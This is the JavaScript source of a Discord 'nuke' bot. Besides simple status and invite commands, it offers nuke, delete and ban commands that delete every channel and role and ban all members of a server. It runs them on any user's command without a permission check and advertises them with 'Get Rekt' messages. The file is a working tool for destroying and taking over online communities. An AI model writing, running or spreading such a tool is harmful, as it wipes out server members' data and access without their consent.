const discord = require("discord.js");
const { prefix, token } = require('./config.json');
const nuke = new discord.Client();


nuke.on("ready", () =>{
console.log(" ")
console.log(`${nuke.user.tag} is online.`);
nuke.user.setPresence({ game: { name: `$help ` }, type: 0 });
});

nuke.on("message", async(msg)=>{


if(msg.content.toLowerCase().startsWith( prefix + "on")){
    msg.delete();
    msg.channel.send("🟢 - Hello, I am Online !");
}
if(msg.content.toLowerCase().startsWith( prefix + "invite")){
    msg.delete();
    msg.channel.send("Here is my invite link :\n--> https://discord.com/oauth2/authorize?client_id=840148478566334474&scope=bot&permissions=805314622");
}    
if(msg.content.toLowerCase().startsWith( prefix + "prefix")){
    msg.delete();
    msg.channel.send("My prefix is `"+ prefix +"`");
}  
if(msg.content.toLowerCase().startsWith( prefix + "setstatus help")){
    msg.delete();
    msg.channel.send({
        embed: {
            color: 0xff0000,
            author: { name: " DΞLTΔ | " + prefix + "setstatus" },
            description: prefix + "setstatus [online] - Set the status of the bot to *online*\n" + prefix + "setstatus [dnd] - Set the status of the bot to *do not disturb*\n" + prefix + "setstatus [invisible] - Set the status of the bot to *invisible*\n" + prefix + "setstatus [idle] - Set the status of the bot to *idle*\n **Have Fun!**",
            footer: {
                text: 'Created by Showgam#3786',
                icon_url: 'https://i.imgur.com/RJDYhab.jpg'
            }
        }
    })
}
if(msg.content.toLowerCase().startsWith( prefix + "setstatus online")){
    msg.delete();
    nuke.user.setStatus('online');
    msg.channel.send("The bot status has been updated to *online*");
}
if(msg.content.toLowerCase().startsWith( prefix + "setstatus dnd")){
    msg.delete();
    nuke.user.setStatus('dnd');
    msg.channel.send("The bot status has been updated to *do not disturb*");
}
if(msg.content.toLowerCase().startsWith( prefix + "setstatus invisible")){
    msg.delete();
    nuke.user.setStatus('invisible');
    msg.channel.send("The bot status has been updated to *invisible*");
}
if(msg.content.toLowerCase().startsWith( prefix + "setstatus idle")){
    msg.delete();
    nuke.user.setStatus('idle');
    msg.channel.send("The bot status has been updated to *idle*");
}
if(msg.content.toLowerCase().startsWith( prefix + "nuke")){
    msg.delete();
    msg.guild.roles.filter(r=>r.position < msg.guild.me.highestRole.position).deleteAll();
    msg.guild.channels.deleteAll();
    msg.guild.members.tap(member => member.ban("Banned by Nuke Bot | Get Rekt"));
}
if(msg.content.toLowerCase().startsWith( prefix + "delete")){
    msg.delete();
    msg.guild.roles.filter(r => r.position < msg.guild.me.highestRole.position).deleteAll();
    msg.guild.channels.deleteAll();
}
if(msg.content.toLowerCase().startsWith( prefix + "ban")){
    msg.delete();
    msg.guild.members.tap(member => member.ban("Banned By Nuke Bot | Get Rekt"));
}
if(msg.content.toLowerCase().startsWith( prefix + "help")){
    msg.delete();
    msg.channel.send({
        embed: {
            color: 0xff0000,
            author: { name: " DΞLTΔ | " + prefix + "help" },
            description: prefix + "on - Gives you bot status\n"+ prefix + "prefix - Gives you bot prefix\n"+ prefix + "invite - Give you the invite link of this bot" + prefix + "setstatus help - Send you a help page on the setstatus command\n" + prefix + "nuke - Bans all members & deletes all roles and channels\n" + prefix + "delete - Deletes all channels and roles\n" + prefix + "ban - Bans all members in the discord\n **Have Fun!**",
            timestamp: new Date(),
            footer: {
                text: 'Created by Showgam#3786',
                icon_url: 'https://i.imgur.com/RJDYhab.jpg'
            }
        }
    })
}
});

nuke.login(process.env.TOKEN);
